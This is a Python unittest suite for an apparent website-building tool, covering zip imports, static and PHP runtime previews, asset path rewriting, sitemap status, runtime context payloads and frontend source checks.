            self.assertIn('data-website-studio-inline-script="dist/js/main.bundle.js"', preview["html"])
            self.assertIn("data-website-studio-inline-script-runner", preview["html"])
            self.assertIn("data-website-studio-preview-shim", preview["html"])
            self.assertIn("data-website-studio-preview-lazy-assets", preview["html"])
            self.assertIn("path=fonts%2FChilly-Variable.ttf", preview["html"])
            self.assertIn("path=assets%2Fimages%2Fhero.mp4", preview["html"])
            self.assertIn("#t=0.1", preview["html"])
            self.assertIn("path=images%2Fcard.webp", preview["html"])
            self.assertIn("path=assets%2Fimages%2Fcard.webp", preview["html"])

            status, css_media = handle_action(
                data_root,
                {"action": "preview_media", "preview_id": preview["preview_id"], "path": "dist/css/style.min.css"},
            )
            self.assertEqual(status, 200)
            rewritten_css = Path(css_media["file_response"]["path"]).read_text(encoding="utf-8")
            self.assertIn("path=fonts%2FChilly-Variable.ttf", rewritten_css)
            self.assertIn("path=assets%2Fimages%2Fcard.webp", rewritten_css)

            status, font_media = handle_action(
                data_root,
                {"action": "preview_media", "preview_id": preview["preview_id"], "path": "fonts/Chilly-Variable.ttf"},
            )
            self.assertEqual(status, 200)
            self.assertTrue(font_media["file_response"]["path"].endswith("assets/fonts/Chilly-Variable.ttf"))

            status, bg_media = handle_action(
                data_root,
                {"action": "preview_media", "preview_id": preview["preview_id"], "path": "images/card.webp"},
            )
            self.assertEqual(status, 200)
            self.assertTrue(bg_media["file_response"]["path"].endswith("assets/images/card.webp"))

            status, nested_preview = handle_action(data_root, {"action": "build_preview", "site_id": imported["site"]["id"], "route": "/legal/terms.php"})
            self.assertEqual(status, 200)
            self.assertIn('data-website-studio-inline-stylesheet="dist/css/style.min.css"', nested_preview["html"])
            self.assertIn("path=assets%2Fimages%2Fcard.webp", nested_preview["html"])
            self.assertNotIn('href="../dist/css/style.min.css"', nested_preview["html"])
            self.assertNotIn('data-src="../assets/images/card.webp"', nested_preview["html"])

            status, alias_preview = handle_action(data_root, {"action": "build_preview", "site_id": imported["site"]["id"], "route": "/terms.html"})
            self.assertEqual(status, 200)
            self.assertIn('data-website-studio-inline-stylesheet="dist/css/style.min.css"', alias_preview["html"])
            self.assertIn("path=assets%2Fimages%2Fcard.webp", alias_preview["html"])
            self.assertNotIn('href="../dist/css/style.min.css"', alias_preview["html"])
            self.assertNotIn('data-src="../assets/images/card.webp"', alias_preview["html"])

    @unittest.skipUnless(shutil.which("php"), "php executable is required for PHP runtime preview integration")
    def test_php_runtime_marks_4xx_routes_failed(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("frontend-website/index.php", "<?php echo '<title>Home</title>';")
                zip_file.writestr(
                    "sitemap.xml",
                    """<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url><loc>https://example.com/</loc></url>
  <url><loc>https://example.com/missing</loc></url>
</urlset>
""",
                )
                zip_file.writestr(
                    "local/router.php",
                    (
                        "<?php\n"
                        "$projectRoot = dirname(__DIR__);\n"
                        "$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH) ?: '/';\n"
                        "if ($uri === '/' || $uri === '/index.php') {\n"
                        "    include $projectRoot . '/frontend-website/index.php';\n"
                        "    return;\n"
                        "}\n"
                        "http_response_code(404);\n"
                        "echo 'missing';\n"
                    ),
                )
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")

            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "PHP 404", "archive_base64": encoded})
            self.assertEqual(status, 201)
            site_id = imported["site"]["id"]
            status, build_payload = handle_action(data_root, {"action": "build_validate", "site_id": site_id})
            self.assertEqual(status, 201)
            self.assertEqual(build_payload["build"]["status"], "passed")

            status, map_payload = handle_action(data_root, {"action": "sitemap", "site_id": site_id})
            self.assertEqual(status, 200)
            routes = {item["route"]: item for item in map_payload["routes"]}
            pages = {item["route"]: item for item in map_payload["items"]}
            self.assertEqual(routes["/missing"]["status"], "failed")
            self.assertEqual(routes["/missing"]["page_id"], "")
            self.assertIn("PHP route returned HTTP 404", " ".join(routes["/missing"]["warnings"]))
            self.assertNotIn("/missing", pages)

    def test_php_site_without_static_html_returns_runtime_diagnostic_preview(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("frontend-website/index.php", "<?php echo 'Home';")
                zip_file.writestr("package.json", '{"scripts":{"build":"vite build"}}')
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")

            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "PHP Runtime", "archive_base64": encoded})
            self.assertEqual(status, 201)
            profile = imported["import"]["source_profile"]
            self.assertFalse(profile["static_preview_supported"])
            self.assertEqual(profile["preview_runtime_kind"], "php")
            self.assertEqual(profile["missing_requirements"], [])
            self.assertTrue(profile["runtime_preview_supported"])

            with patch("preview_runtime.shutil.which", return_value=None):
                status, preview = handle_action(data_root, {"action": "build_preview", "site_id": imported["site"]["id"]})
            self.assertEqual(status, 200)
            self.assertEqual(preview["runtime_kind"], "php")
            self.assertEqual(preview["runtime_status"], "blocked")
            self.assertEqual(preview["page_id"], "")
            self.assertTrue(preview["preview_url"].startswith("/apps/website-studio/preview-runtime/?"))
            self.assertIn("Preview runtime unavailable", preview["html"])
            self.assertIn("php executable", preview["missing_requirements"][0])

            with patch(
                "store.render_runtime_preview",
                return_value={
                    "status": "blocked",
                    "runtime_kind": "php",
                    "html": "",
                    "title": "",
                    "source_files": [],
                    "warnings": [],
                    "missing_requirements": ["php executable is not available to the Website Studio preview runtime"],
                    "http_status": 0,
                },
            ):
                status, document = handle_action(data_root, {"action": "preview_document", "preview_id": preview["preview_id"]})
            self.assertEqual(status, 200)
            self.assertEqual(document["preview"]["status"], "blocked")
            self.assertIn("Preview runtime unavailable", document["html"])
            self.assertIn("php executable", document["html"])

            with closing(sqlite3.connect(data_root / "app.sqlite")) as db, db:
                preview_row = db.execute("SELECT status, page_id FROM previews WHERE id = ?", (preview["preview_id"],)).fetchone()
                session_row = db.execute("SELECT status, runtime_kind FROM runtime_sessions WHERE preview_id = ?", (preview["preview_id"],)).fetchone()
            self.assertEqual(preview_row, ("blocked", ""))
            self.assertEqual(session_row, ("blocked", "php"))

    def test_runtime_status_reports_latest_build_preview_and_session(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Runtime Health"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]

            status, preview = handle_action(data_root, {"action": "build_preview", "site_id": site_id})
            self.assertEqual(status, 200)
            status, build_payload = handle_action(data_root, {"action": "build_validate", "site_id": site_id})
            self.assertEqual(status, 201)

            status, runtime = handle_action(data_root, {"action": "runtime_status", "site_id": site_id})
            self.assertEqual(status, 200)
            self.assertEqual(runtime["site_id"], site_id)
            self.assertEqual(runtime["runtime_kind"], "static_export")
            self.assertEqual(runtime["runtime_status"], "ready")
            self.assertEqual(runtime["latest_preview"]["id"], preview["preview_id"])
            self.assertEqual(runtime["latest_build"]["id"], build_payload["build"]["id"])
            self.assertEqual(runtime["latest_runtime_session"]["preview_id"], preview["preview_id"])
            self.assertEqual(runtime["latest_runtime_session"]["status"], "ready")

            status, active = handle_action(data_root, {"action": "active_context", "site_id": site_id})
            self.assertEqual(status, 200)
            self.assertEqual(active["runtime_status"], "ready")
            self.assertEqual(active["preview_id"], preview["preview_id"])
            self.assertEqual(active["preview_url"], preview["preview_url"])
            self.assertEqual(active["preview"]["preview_id"], preview["preview_id"])
            self.assertEqual(active["runtime"]["latest_preview"]["id"], preview["preview_id"])

            status, page_payload = handle_action(data_root, {"action": "page_context", "site_id": site_id, "route": "/"})
            self.assertEqual(status, 200)
            self.assertEqual(page_payload["runtime_status"], "ready")
            self.assertEqual(page_payload["preview_url"], preview["preview_url"])

    def test_build_preview_reuses_ready_static_preview_until_revision_changes(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Preview Cache"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]

            status, first = handle_action(data_root, {"action": "build_preview", "site_id": site_id, "route": "/"})
            self.assertEqual(status, 200)
            status, second = handle_action(data_root, {"action": "build_preview", "site_id": site_id, "route": "/"})
            self.assertEqual(status, 200)
            self.assertEqual(second["preview_id"], first["preview_id"])
            status, slim = handle_action(data_root, {"action": "build_preview", "site_id": site_id, "route": "/", "include_html": False})
            self.assertEqual(status, 200)
            self.assertEqual(slim["preview_id"], first["preview_id"])
            self.assertEqual(slim["html"], "")
            with closing(sqlite3.connect(data_root / "app.sqlite")) as db:
                preview_count = db.execute("SELECT COUNT(*) FROM previews WHERE site_id = ?", (site_id,)).fetchone()[0]
            self.assertEqual(preview_count, 1)

            _edit_index(data_root, site_id, marker="Cache Bust")
            status, third = handle_action(data_root, {"action": "build_preview", "site_id": site_id, "route": "/"})
            self.assertEqual(status, 200)
            self.assertNotEqual(third["preview_id"], first["preview_id"])
            with closing(sqlite3.connect(data_root / "app.sqlite")) as db:
                preview_count = db.execute("SELECT COUNT(*) FROM previews WHERE site_id = ?", (site_id,)).fetchone()[0]
            self.assertEqual(preview_count, 2)

    def test_active_context_uses_runtime_status_when_source_profile_is_stale(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Runtime Context"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]
            preview_url = "/apps/website-studio/preview-runtime/?preview_id=preview_ready&route=%2F"
            with closing(sqlite3.connect(data_root / "app.sqlite")) as db, db:
                db.execute(
                    """
                    INSERT INTO builds(
                      id, site_id, status, runtime_kind, preview_url, artifact_ref_json,
                      source_profile_json, route_count, asset_count, warnings_json,
                      missing_requirements_json, logs_summary, created_at, updated_at
                    )
                    VALUES ('build_ready', ?, 'passed', 'php', ?, '{}', '{}', 1, 0, '[]', '[]', '', '2026-01-01T00:00:00+00:00', '2026-01-01T00:00:00+00:00')
                    """,
                    (site_id, preview_url),
                )
                db.execute(
                    """
                    INSERT INTO previews(
                      id, site_id, route, page_id, build_id, runtime_kind, preview_url,
                      warnings_json, missing_requirements_json, artifact_ref_json, status, created_at
                    )
                    VALUES ('preview_ready', ?, '/', '', 'build_ready', 'php', ?, '[]', '[]', '{}', 'ready', '2026-01-01T00:00:01+00:00')
                    """,
                    (site_id, preview_url),
                )
                db.execute(
                    """
                    INSERT INTO runtime_sessions(
                      id, site_id, preview_id, build_id, runtime_kind, status, preview_url,
                      route, health_json, missing_requirements_json, created_at, updated_at
                    )
                    VALUES ('runtime_ready', ?, 'preview_ready', 'build_ready', 'php', 'ready', ?, '/', '{}', '[]', '2026-01-01T00:00:01+00:00', '2026-01-01T00:00:01+00:00')
                    """,
                    (site_id, preview_url),
                )

            stale_profile = {"preview_runtime_kind": "php", "runtime_preview_status": "blocked", "missing_requirements": []}
            with patch("store.source_profile", return_value=stale_profile), patch(
                "store.runtime_capability_status",
                return_value={"runtime_kind": "php", "runtime_status": "ready", "missing_requirements": []},
            ):
                status, context = handle_action(data_root, {"action": "active_context", "site_id": site_id})

            self.assertEqual(status, 200)
            self.assertEqual(context["runtime_status"], "ready")
            self.assertEqual(context["runtime_kind"], "php")
            self.assertEqual(context["preview_id"], "preview_ready")
            self.assertNotEqual(context["preview_url"], preview_url)
            self.assertTrue(context["preview_url"].startswith(preview_url + "&runtime_version="))
            self.assertEqual(context["runtime"]["latest_preview"]["preview_url"], context["preview_url"])
            self.assertEqual(context["runtime"]["latest_runtime_session"]["preview_url"], context["preview_url"])
            self.assertEqual(context["runtime"]["latest_runtime_session"]["health"]["preview_url"], context["preview_url"])
            self.assertEqual(context["preview"]["runtime_status"], "ready")

    def test_runtime_status_normalizes_stale_source_profile_status(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Runtime Status"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]
            stale_profile = {"preview_runtime_kind": "php", "runtime_preview_status": "blocked", "missing_requirements": []}
            with closing(sqlite3.connect(data_root / "app.sqlite")) as db, db:
                db.execute(
                    "UPDATE sites SET source_profile_json = ?, source_version = 'src_test' WHERE id = ?",
                    (json.dumps(stale_profile), site_id),
                )
                db.execute(
                    """
                    INSERT INTO builds(
                      id, site_id, status, runtime_kind, preview_url, artifact_ref_json, source_profile_json,
                      route_count, asset_count, warnings_json, missing_requirements_json, logs_summary, created_at, updated_at
                    )
                    VALUES ('build_ready', ?, 'passed', 'php', '', ?, ?, 1, 0, '[]', '[]', '', '2026-01-01T00:00:00+00:00', '2026-01-01T00:00:00+00:00')
                    """,
                    (site_id, json.dumps({"source_version": "src_test"}), json.dumps(stale_profile)),
                )

            with patch(
                "store.runtime_capability_status",
                return_value={"runtime_kind": "php", "runtime_status": "ready", "missing_requirements": []},
            ):
                status, runtime = handle_action(data_root, {"action": "runtime_status", "site_id": site_id})
                self.assertEqual(status, 200)
                status, site_status_payload = handle_action(data_root, {"action": "site_status", "site_id": site_id})

            self.assertEqual(status, 200)
            self.assertEqual(runtime["runtime_status"], "ready")
            self.assertEqual(runtime["source_profile"]["runtime_preview_status"], "ready")
            self.assertEqual(runtime["latest_build"]["source_profile"]["runtime_preview_status"], "ready")
            self.assertTrue(runtime["source_profile"]["runtime_preview_supported"])
            self.assertEqual(site_status_payload["source_profile"]["runtime_preview_status"], "ready")
            self.assertEqual(site_status_payload["site"]["source_profile"]["runtime_preview_status"], "ready")
            self.assertEqual(site_status_payload["runtime_status"], "ready")

    def test_listing_payloads_normalize_stale_source_profile_status(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Runtime Lists"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]
            stale_profile = {"preview_runtime_kind": "php", "runtime_preview_status": "blocked", "missing_requirements": []}
            with closing(sqlite3.connect(data_root / "app.sqlite")) as db, db:
                db.execute(
                    "UPDATE sites SET source_profile_json = ?, source_version = 'src_test' WHERE id = ?",
                    (json.dumps(stale_profile), site_id),
                )
                db.execute(
                    """
                    INSERT INTO builds(
                      id, site_id, status, runtime_kind, preview_url, artifact_ref_json, source_profile_json,
                      route_count, asset_count, warnings_json, missing_requirements_json, logs_summary, created_at, updated_at
                    )
                    VALUES ('build_ready', ?, 'passed', 'php', '', ?, ?, 1, 0, '[]', '[]', '', '2026-01-01T00:00:00+00:00', '2026-01-01T00:00:00+00:00')
                    """,
                    (site_id, json.dumps({"source_version": "src_test"}), json.dumps(stale_profile)),
                )

            status, sites = handle_action(data_root, {"action": "sites_list"})
            self.assertEqual(status, 200)
            status, builds = handle_action(data_root, {"action": "builds_list", "site_id": site_id})
            self.assertEqual(status, 200)
            status, changes = handle_action(data_root, {"action": "list_changes", "site_id": site_id})
            self.assertEqual(status, 200)

            self.assertEqual(sites["items"][0]["source_profile"]["runtime_preview_status"], "ready")
            self.assertTrue(sites["items"][0]["source_profile"]["runtime_preview_supported"])
            self.assertEqual(builds["items"][0]["source_profile"]["runtime_preview_status"], "ready")
            self.assertEqual(changes["builds"][0]["source_profile"]["runtime_preview_status"], "ready")
            self.assertEqual(changes["builds"][0]["source_profile"]["missing_requirements"], [])

            with closing(sqlite3.connect(data_root / "app.sqlite")) as db, db:
                db.execute("UPDATE sites SET source_version = 'src_after_build' WHERE id = ?", (site_id,))
            status, sites_after_source_change = handle_action(data_root, {"action": "sites_list"})

            self.assertEqual(status, 200)
            self.assertEqual(sites_after_source_change["items"][0]["source_profile"]["runtime_preview_status"], "blocked")

    def test_active_context_includes_route_assets_and_change_state(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Acme"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]
            status, context = handle_action(data_root, {"action": "active_context", "site_id": site_id})

            self.assertEqual(status, 200)
            self.assertEqual(context["active_view"], "page")
            self.assertEqual(context["site_id"], site_id)
            self.assertIn("routes", context)
            self.assertIn("assets", context)
            self.assertIn("changed_files_count", context)
            self.assertIn("source_profile", context)
            self.assertTrue(context["source_profile"]["static_preview_supported"])
            self.assertEqual(context["runtime_kind"], "static_export")
            self.assertEqual(context["runtime_status"], "ready")
            self.assertIn("preview", context)

    def test_page_context_accepts_route_and_asset_selection(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("index.html", '<title>Home</title><img src="assets/logo.png">')
                zip_file.writestr("assets/logo.png", b"\x89PNG\r\nphase1")
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")
            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "Context", "archive_base64": encoded})
            self.assertEqual(status, 201)
            site_id = imported["site"]["id"]
            status, map_payload = handle_action(data_root, {"action": "sitemap", "site_id": site_id})
            self.assertEqual(status, 200)
            route_id = map_payload["routes"][0]["id"]
            asset_id = map_payload["assets"][0]["id"]

            status, route_context = handle_action(data_root, {"action": "page_context", "site_id": site_id, "route_id": route_id})
            self.assertEqual(status, 200)
            self.assertEqual(route_context["active_view"], "page")
            self.assertEqual(route_context["route_id"], route_id)
            self.assertEqual(route_context["route"], "/")
            self.assertEqual(route_context["preview"]["route_id"], route_id)

            status, asset_context = handle_action(data_root, {"action": "page_context", "site_id": site_id, "asset_id": asset_id})
            self.assertEqual(status, 200)
            self.assertEqual(asset_context["active_view"], "asset")
            self.assertEqual(asset_context["asset_id"], asset_id)
            self.assertEqual(asset_context["asset_path"], "assets/logo.png")

    def test_page_context_uses_route_specific_preview_report_and_visual_assets(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("index.html", '<title>Home</title><main><img src="assets/home.webp"></main>')
                zip_file.writestr("about.html", '<title>About</title><main><img src="assets/about.webp"></main>')
                zip_file.writestr("assets/home.webp", b"home")
                zip_file.writestr("assets/about.webp", b"about")
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")
            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "Route Reports", "archive_base64": encoded})
            self.assertEqual(status, 201)
            site_id = imported["site"]["id"]

            status, home_preview = handle_action(data_root, {"action": "build_preview", "site_id": site_id, "route": "/"})
            self.assertEqual(status, 200)
            status, home_report = handle_action(data_root, {"action": "preview_report", "preview_id": home_preview["preview_id"]})
            self.assertEqual(status, 201)
            self.assertEqual(home_report["report"]["route"], "/")

            status, about_preview = handle_action(data_root, {"action": "build_preview", "site_id": site_id, "route": "/about"})
            self.assertEqual(status, 200)
            status, about_report = handle_action(data_root, {"action": "preview_report", "preview_id": about_preview["preview_id"]})
            self.assertEqual(status, 201)
            self.assertEqual(about_report["report"]["route"], "/about")

            status, runtime = handle_action(data_root, {"action": "runtime_status", "site_id": site_id})
            self.assertEqual(status, 200)
            self.assertEqual(runtime["latest_preview"]["route"], "/about")
            self.assertEqual(runtime["latest_runtime_session"]["route"], "/about")
            self.assertEqual(runtime["latest_preview_report"]["route"], "/about")

            status, home_context = handle_action(data_root, {"action": "page_context", "site_id": site_id, "route": "/"})
            self.assertEqual(status, 200)
            self.assertEqual(home_context["runtime"]["latest_preview"]["route"], "/")
            self.assertEqual(home_context["runtime"]["latest_runtime_session"]["route"], "/")
            self.assertEqual(home_context["runtime"]["latest_preview_report"]["route"], "/")
            home_visual_assets = {item["path"] for item in home_context["visual_assets"]}
            self.assertIn("assets/home.webp", home_visual_assets)
            self.assertNotIn("assets/about.webp", home_visual_assets)

            status, about_context = handle_action(data_root, {"action": "page_context", "site_id": site_id, "route": "/about"})
            self.assertEqual(status, 200)
            self.assertEqual(about_context["runtime"]["latest_preview"]["route"], "/about")
            self.assertEqual(about_context["runtime"]["latest_runtime_session"]["route"], "/about")
            self.assertEqual(about_context["runtime"]["latest_preview_report"]["route"], "/about")
            about_visual_assets = {item["path"] for item in about_context["visual_assets"]}
            self.assertIn("assets/about.webp", about_visual_assets)
            self.assertNotIn("assets/home.webp", about_visual_assets)

    def test_page_context_report_lookup_is_direct_and_alias_aware(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("index.html", '<title>Home</title><main><img src="assets/home.webp"></main>')
                zip_file.writestr("about.html", '<title>About</title><main><img src="assets/about.webp"></main>')
                zip_file.writestr("assets/home.webp", b"home")
                zip_file.writestr("assets/about.webp", b"about")
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")
            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "Report Window", "archive_base64": encoded})
            self.assertEqual(status, 201)
            site_id = imported["site"]["id"]

            status, home_preview = handle_action(data_root, {"action": "build_preview", "site_id": site_id, "route": "/"})
            self.assertEqual(status, 200)
            status, home_report = handle_action(data_root, {"action": "preview_report", "preview_id": home_preview["preview_id"]})
            self.assertEqual(status, 201)
            self.assertEqual(home_report["report"]["route"], "/")

            status, about_preview = handle_action(data_root, {"action": "build_preview", "site_id": site_id, "route": "/about"})
            self.assertEqual(status, 200)
            with closing(sqlite3.connect(data_root / "app.sqlite")) as db, db:
                for index in range(101):
                    created_at = f"2099-01-01T00:{index // 60:02d}:{index % 60:02d}+00:00"
                    report = {
                        "id": f"report_noise_{index:03d}",
                        "site_id": site_id,
                        "preview_id": about_preview["preview_id"],
                        "route": "/about.php",
                        "runtime_kind": "static_export",
                        "runtime_status": "ready",
                        "generated_at": created_at,
                        "source_map": {
                            "route": "/about.php",
                            "asset_refs": ["assets/about.webp"],
                            "asset_index": [
                                {
                                    "path": "assets/about.webp",
                                    "kind": "image",
                                    "content_type": "image/webp",
                                    "status": "referenced",
                                }
                            ],
                        },
                        "asset_coverage": {
                            "resolved": [
                                {
                                    "path": "assets/about.webp",
                                    "requested_path": "assets/about.webp",
                                    "kind": "image",
                                    "content_type": "image/webp",
                                    "status": "referenced",
                                }
                            ]
                        },
                    }
                    db.execute(
                        """
                        INSERT INTO preview_reports(id, site_id, preview_id, route, status, report_json, created_at)
                        VALUES (?, ?, ?, ?, 'passed', ?, ?)
                        """,
                        (report["id"], site_id, about_preview["preview_id"], report["route"], json.dumps(report, sort_keys=True), created_at),
                    )

            status, home_context = handle_action(data_root, {"action": "page_context", "site_id": site_id, "route": "/"})
            self.assertEqual(status, 200)
            self.assertEqual(home_context["runtime"]["latest_preview"]["route"], "/")
            self.assertEqual(home_context["runtime"]["latest_runtime_session"]["route"], "/")
            self.assertEqual(home_context["runtime"]["latest_preview_report"]["route"], "/")
            home_visual_assets = {item["path"] for item in home_context["visual_assets"]}
            self.assertIn("assets/home.webp", home_visual_assets)
            self.assertNotIn("assets/about.webp", home_visual_assets)

            status, navigation = handle_action(data_root, {"action": "navigation_analyze", "site_id": site_id})
            self.assertEqual(status, 200)
            self.assertTrue(navigation["analysis_coverage"]["complete"])
            navigation_pages = {item["route"]: item for item in navigation["pages"]}
            self.assertEqual(navigation_pages["/"]["preview_report_id"], home_report["report"]["id"])
            self.assertEqual(navigation_pages["/about"]["preview_report_id"], "report_noise_100")

            status, about_alias_context = handle_action(data_root, {"action": "page_context", "site_id": site_id, "route": "/about.html"})
            self.assertEqual(status, 200)
            self.assertEqual(about_alias_context["route"], "/about")
            self.assertEqual(about_alias_context["runtime"]["latest_preview"]["route"], "/about")
            self.assertEqual(about_alias_context["runtime"]["latest_runtime_session"]["route"], "/about")
            self.assertEqual(about_alias_context["runtime"]["latest_preview_report"]["route"], "/about.php")
            about_visual_assets = {item["path"] for item in about_alias_context["visual_assets"]}
            self.assertIn("assets/about.webp", about_visual_assets)
            self.assertNotIn("assets/home.webp", about_visual_assets)

    def test_reference_manifest_and_search_match_declared_entities(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Acme"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]
            _edit_index(data_root, site_id)
            status, _ = handle_action(data_root, {"action": "publish_request", "site_id": site_id})
            self.assertEqual(status, 201)

            status, manifest = handle_action(data_root, {"action": "reference_manifest"})
            self.assertEqual(status, 200)
            searchable = {item["entity_type"]: item["searchable"] for item in manifest["entity_types"]}
            self.assertFalse(searchable["revision"])
            self.assertTrue(searchable["component"])
            self.assertTrue(searchable["publish_request"])

            status, results = handle_action(data_root, {"action": "reference_search", "query": "pending"})
            self.assertEqual(status, 200)
            self.assertIn("publish_request", {item["entity_type"] for item in results["items"]})

    def test_reference_payloads_include_app_pages_and_deep_links(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("index.html", '<title>Home</title><img src="assets/logo.png">')
                zip_file.writestr("assets/logo.png", b"\x89PNG\r\nphase1")
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")
            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "Links", "archive_base64": encoded})
            self.assertEqual(status, 201)
            site_id = imported["site"]["id"]
            status, map_payload = handle_action(data_root, {"action": "sitemap", "site_id": site_id})
            self.assertEqual(status, 200)

            for entity_type, entity_id, route_prefix in (
                ("site", site_id, "sites/"),
                ("page", map_payload["items"][0]["id"], "pages/"),
                ("route", map_payload["routes"][0]["id"], "routes/"),
                ("asset", map_payload["assets"][0]["id"], "assets/"),
                ("revision", imported["revision"]["id"], "revisions/"),
            ):
                status, resolved = handle_action(data_root, {"action": "reference_resolve", "entity_type": entity_type, "id": entity_id})
                self.assertEqual(status, 200)
                self.assertTrue(resolved["item"]["app_page"].startswith(route_prefix))
                self.assertEqual(resolved["item"]["deep_link"], f"/app/website-studio/{resolved['item']['app_page']}")

    def test_cli_default_lists_sites(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            payload = {
                "app_id": "website-studio",
                "workspace_id": "default",
                "data_root": tmp,
                "arguments": {},
            }

            result = subprocess.run(
                [sys.executable, str(APP_ROOT / "cli" / "app_cli.py")],
                input=json.dumps(payload),
                text=True,
                capture_output=True,
                check=True,
                cwd=APP_ROOT,
                env={**os.environ, "PYTHONPATH": str(MAVERICK_ROOT)},
            )

            parsed = json.loads(result.stdout)
            self.assertEqual(parsed["status_code"], 200)
            self.assertEqual(parsed["items"], [])

    def test_sitemap_widget_avoids_route_html_interpolation(self) -> None:
        widget_source = (APP_ROOT / "frontend" / "src" / "widgets" / "website-studio-sitemap-sidebar" / "main.tsx").read_text(encoding="utf-8")
        tree_source = (APP_ROOT / "frontend" / "src" / "components" / "ui" / "tree.tsx").read_text(encoding="utf-8")

        self.assertNotIn('data-route="${page.route}"', widget_source)
        self.assertNotIn("list.innerHTML = filtered.map", widget_source)
        self.assertNotIn("dangerouslySetInnerHTML", widget_source)
        self.assertIn("TreeProvider", widget_source)
        self.assertIn("TreeView", widget_source)
        self.assertIn("WebsiteTreeNodeView", widget_source)
        self.assertIn("TreeNodeTrigger", widget_source)
        self.assertIn("TreeExpander", widget_source)
        self.assertIn("TreeIcon", widget_source)
        self.assertIn("TreeLabel", widget_source)
        self.assertIn("export const TreeProvider", tree_source)
        self.assertIn("export const TreeNodeTrigger", tree_source)
        self.assertIn("from 'lucide-react'", tree_source)
        self.assertNotIn("from 'motion/react'", tree_source)
        self.assertIn("cachedWorkspaceSnapshot", widget_source)
        self.assertIn("action: 'navigation_analyze'", widget_source)
        self.assertIn("hydrateVisualNavigation", widget_source)
        self.assertLess(widget_source.index("const fresh = await request.fresh"), widget_source.index("await hydrateVisualNavigation(selectedSiteId"))
        self.assertNotIn("action: 'sitemap'", widget_source)
        self.assertNotIn("map.assets || []", widget_source)
        self.assertIn('<option value="">Select a site</option>', widget_source)
        self.assertIn("Select a site to load its visual navigation.", widget_source)
        self.assertIn("route_id", widget_source)
        self.assertIn("component_id", widget_source)
        self.assertIn("target_selector", widget_source)
        self.assertIn("maverick.widget.data-changed", widget_source)
        self.assertIn("function buildTree(navigation:", widget_source)
        self.assertNotIn("action: 'site_status'", widget_source)
        self.assertNotIn("action: 'list_changes'", widget_source)
        self.assertIn("modified", widget_source)
        self.assertIn("requestedSite || persistedSite || selectableSites.find", widget_source)
        self.assertIn("groupNode('group:pages'", widget_source)
        self.assertIn("Sections", widget_source)
        self.assertIn("Components", widget_source)
        self.assertIn("statusSummary(navigation", widget_source)
        self.assertIn("Other routes", widget_source)
        self.assertIn("group:warnings", widget_source)
        self.assertNotIn("Rendered routes", widget_source)
        self.assertNotIn("No observed sections", widget_source)
        self.assertNotIn("No agent warnings", widget_source)
        self.assertNotIn("Backend and config", widget_source)
        self.assertNotIn("bucketAssets", widget_source)
        self.assertIn("toggleExpanded", tree_source)
        self.assertIn("No visual pages", widget_source)

    def test_frontend_handles_route_and_asset_deep_links(self) -> None:
        app_source = (APP_ROOT / "frontend" / "src" / "App.tsx").read_text(encoding="utf-8")

        self.assertIn("appPage.startsWith('routes/')", app_source)
        self.assertIn("appPage.startsWith('assets/')", app_source)
        self.assertIn("appPage.startsWith('components/')", app_source)
        self.assertIn("appPage.startsWith('sections/')", app_source)
        self.assertIn("appPage.startsWith('anchors/')", app_source)
        self.assertIn("route_id", app_source)
        self.assertIn("asset_id", app_source)
        self.assertIn("component_id", app_source)
        self.assertIn("target_selector", app_source)
        self.assertIn("data-target-selector", app_source)
